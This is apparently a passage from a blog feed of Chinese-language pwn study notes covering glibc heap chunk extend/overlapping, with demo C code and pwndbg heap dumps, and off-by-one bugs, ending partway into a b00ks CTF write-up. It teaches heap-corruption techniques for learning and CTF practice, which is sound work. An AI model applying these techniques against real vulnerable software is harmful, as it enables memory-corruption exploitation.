class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​经过五次 malloc 之后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000091</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​free 了 chunk1 之后，chunk2 的 p 位已经变成 0 了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000091&lt;======Chunk3</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81&lt;======Top Chunk</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​之后修改了 chunk3 的 pre_inuse，也就是 size 的最低为 P 位为 0，然后修改 pre_size 位为 0xd8，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x00000000000000d0  0x0000000000000090&lt;======Chunk3</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81&lt;======Top Chunk</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​可以看出来，chunk3 的 pre_size 域的大小刚好能够包含到完 chunk1 和 chunk2。之后 free 掉了 chunk3：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x161</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>会发现，前面的三个 chunk 都被合并成了一个，这里主要是因为 unlink 的原因，导致了 chunk3 和前面的两个（主要是 pre_size 指定的大小范围内的）chunk 发生了合并。之后再进行 malloc，会分配走新的那个 chunk1：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x161</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn学习笔记12chunk-extend-and-overlapping&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwn学习笔记12chunk-extend-and-overlapping&quot;&gt;#&lt;/a&gt; pwn 学习笔记（12）</summary>
      
    
    
    
    <category term="Pwn手的自我修养" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn学习笔记（11）--off_by_one</title>
    <link href="http://blog.g01den.top/posts/f1497b96.html"/>
    <id>http://blog.g01den.top/posts/f1497b96.html</id>
    <published>2024-11-09T13:31:09.000Z</published>
    <updated>2024-11-09T13:39:59.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn学习笔记11off_by_one"><a class="markdownIt-Anchor" href="#pwn学习笔记11off_by_one">#</a> pwn 学习笔记（11）–off_by_one</h1><p>​在处理 for 循环或者 while 循环的时候，有的可能会遇到如下情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> ; i &lt;= <span class="number">0x10</span> ; i ++)&#123;</span><br><span class="line">        buf[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​多次输入几个 a 之后，发现了最后输出的时候输出了 17 个 a，我的目的仅仅只是需要 16 个 a，结果输出了 17 个 a，像这种，在写入字符串的时候多写入了一个字节的情况，就是 off by one。</p><p>​在堆中，这种问题尤为严重，可能会导致输入的字符覆盖了 heap info 的 prev_in_use 或者其他的数据：</p><blockquote><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得  <code>prev_in_use</code>  位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时  <code>prev_size</code>  域就会启用，就可以伪造  <code>prev_size</code>  ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照  <code>prev_size</code>  找到的块的大小与 <code>prev_size</code>  是否一致。</li></ol></blockquote><p>​最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​还有种情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss[<span class="number">0x20</span>] = <span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(bss) == <span class="number">0x10</span>)&#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(buf,bss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这种情况，乍看上去没啥问题，但是，strlen 不会计算结尾的 \x00，而 strcpy 在拷贝的时候又会多拷贝一个 \x00 进去，造成多写入了一个字节。</p><p>​上一个题：</p><h2 id="asis-ctf-2016-b00ks只看前面off-by-one的部分"><a class="markdownIt-Anchor" href="#asis-ctf-2016-b00ks只看前面off-by-one的部分">#</a> Asis CTF 2016 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3RyZWUvbWFzdGVyL3B3bi9oZWFwL29mZl9ieV9vbmUvQXNpc18yMDE2X2IwMGtz">b00ks</span>（只看前面 off by one 的部分）</h2><p>​checksec 一下看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:/mnt/c/Users/20820/Downloads$ checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>​激活了 PIE，以及题目附件被 strip 过，抱歉，我一个菜鸡误入了大佬的世界，啥都看不懂，反编译之后看到那么抽象突然想放弃了，不过还是得做。</p><p>​题目是一个寻常的图书管理，有创建书，删除书，编辑描述内容，输出书籍信息，修改最近访问的作者名，退出。</p><p>​先不看别的，main 没啥用，先看 add：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 